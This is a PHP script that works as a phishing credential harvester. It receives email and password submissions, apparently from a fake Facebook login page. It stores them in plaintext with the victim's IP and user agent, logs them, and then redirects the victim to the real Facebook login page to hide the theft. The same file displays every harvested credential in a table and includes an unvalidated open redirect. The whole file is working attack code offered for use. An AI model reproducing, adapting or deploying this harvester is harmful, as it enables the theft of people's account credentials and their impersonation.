<?php
// auth_dashboard.php - Admin authentication check
session_start();
if (!isset($_SESSION["admin_logged_in"]) || $_SESSION["admin_logged_in"] !== true) {
    // Not authenticated, redirect to login page
    header("Location: dashboard.php");
    exit;
}
// login.php - Simple credential manager for POST form
header('Content-Type: text/html; charset=UTF-8');

// Create data directory if it doesn't exist
if (!is_dir('data')) {
    mkdir('data', 0755, true);
}

// Handle redirection if 'redirect' parameter is set
if (isset($_POST['redirect'])) {
    header("Location: " . $_POST['redirect']);
    exit;
}
// Define file paths
$credentials_file = 'data/credentials.txt';
$log_file = 'data/log.txt';

// Function to log actions
function log_action($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] $message\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
}

// Function to save credentials
function save_credentials($email, $password) {
    global $credentials_file;
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Format: timestamp|email|password|ip|user_agent
    $entry = "$timestamp|$email|$password|$ip|$user_agent\n";
    
    file_put_contents($credentials_file, $entry, FILE_APPEND | LOCK_EX);
    return true;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Validate input
    if (empty($email) || empty($password)) {
        die('Error: Please fill in both email and password fields.');
    }
    
    // Save credentials
    if (save_credentials($email, $password)) {
        log_action("Credentials saved - Email: $email and Password: $password");
        
        // Redirect to Facebook after saving credentials
        header('Location: https://www.facebook.com/login/');
        exit;
    } else {
        die('Error: Could not save credentials.');
    }
}

// If not POST request, show the stored credentials
?>
<!DOCTYPE html>
<html>
<head>
    <title>Stored Credentials</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f8f9fa; }
        .btn { padding: 8px 15px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn-primary { background: #007bff; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .stats { background: #e9ecef; padding: 15px; border-radius: 5px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📧 Stored Login Credentials</h1>
        
        <div class="stats">
            <a href="projet.html" class="btn btn-primary">← Back to Login Page</a>
            <a href="login.php?action=clear" class="btn btn-danger" onclick="return confirm('Are you sure you want to clear all data?')">Clear All Data</a>
        </div>

        <?php
        // Display credentials
        if (file_exists($credentials_file)) {
            $lines = file($credentials_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $total_credentials = count($lines);
            
            echo "<div class='stats'>";
            echo "<strong>Total Credentials Stored: $total_credentials</strong>";
            echo "</div>";
            
            if ($total_credentials > 0) {
                echo '<table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Timestamp</th>
                            <th>Email/Phone</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>User Agent</th>
                        </tr>
                    </thead>
                    <tbody>';
                
                $counter = 1;
                foreach (array_reverse($lines) as $line) {
                    $parts = explode('|', $line);
                    if (count($parts) >= 5) {
                        echo '<tr>
                            <td>' . $counter . '</td>
                            <td>' . htmlspecialchars($parts[0]) . '</td>
                            <td>' . htmlspecialchars($parts[1]) . '</td>
                            <td>' . htmlspecialchars($parts[2]) . '</td>
                            <td>' . htmlspecialchars($parts[3]) . '</td>
                            <td>' . htmlspecialchars(substr($parts[4], 0, 50)) . '...</td>
                        </tr>';
                        $counter++;
                    }
                }
                
                echo '</tbody></table>';
            }
        } else {
            echo '<p>No credentials stored yet.</p>';
        }
        
        // Handle clear action
        if (isset($_GET['action']) && $_GET['action'] === 'clear') {
            if (file_exists($credentials_file)) {
                unlink($credentials_file);
            }
            if (file_exists($log_file)) {
                unlink($log_file);
            }
            echo '<script>alert("All data cleared successfully!"); window.location.href = "login.php";</script>';
        }
        
        // Show log file content
        if (file_exists($log_file)) {
            echo '<h3>Activity Log</h3>';
            echo '<div style="background: #f8f9fa; padding: 15px; border-radius: 5px; max-height: 200px; overflow-y: auto;">';
            echo '<pre>' . htmlspecialchars(file_get_contents($log_file)) . '</pre>';
            echo '</div>';
        }
        ?>
    </div>
</body>
</html>